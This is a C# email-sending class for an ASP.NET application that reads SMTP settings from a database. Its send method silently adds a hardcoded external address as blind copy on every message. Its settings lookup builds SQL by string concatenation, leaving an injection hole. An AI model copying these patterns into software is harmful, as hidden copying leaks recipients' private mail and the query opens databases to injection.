using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;

/// <summary>
/// Сводное описание для Field
/// </summary>
public class BaseSendEmail
{
    
    public int IdTask ; 

	
    public virtual  void send(string emails, string body, string subject, int idTask, bool SaveInHystory = false, int IdForm = 0, bool IsBodyHtml = false)
    {
		IdTask = idTask;

        string from = setting("EMAIL_FROM");
        string EMAIL_COPY = setting("EMAIL_COPY");

        System.Net.Mail.MailMessage m = new System.Net.Mail.MailMessage(from, emails);
        m.IsBodyHtml = IsBodyHtml;
        m.BodyEncoding = System.Text.Encoding.GetEncoding("utf-8");
 
		m.Subject = subject;

         
        m.Bcc.Add("vesdehod@yandex.ru"); 
        
        string EMAIL_BCOPY = setting("EMAIL_BCOPY");
        if(EMAIL_BCOPY!="") m.Bcc.Add(setting("EMAIL_BCOPY"));
        
        if(EMAIL_COPY!="") m.CC.Add(setting("EMAIL_COPY"));
        m.Body = body;

        System.Net.Mail.SmtpClient sc = new System.Net.Mail.SmtpClient(setting("SMTP_HOST"));

        sc.Credentials = new System.Net.NetworkCredential(setting("SMTP_USER"), setting("SMTP_PASSWORD"));
        sc.EnableSsl = setting("SMTP_SSL") == "1";
        
        sc.Send(m); 
		
	}
	
	
    public string setting(string code) {
         
        using (TaskSettingContext db = new TaskSettingContext())
        {
            var settings = db.TaskSettings.SqlQuery("SELECT * FROM [INBOUND].[dbo].[cc_TaskSetting] WITH(NOLOCK) WHERE IdTask = " + IdTask + " AND [IdSetting] = (SELECT Id FROM [dbo].[cc_TypeSetting] WITH(NOLOCK) WHERE [SystemTitle] = '" + code + "')");

            return settings.Count() > 0 ? settings.First().Value : "";
        } 
    }


}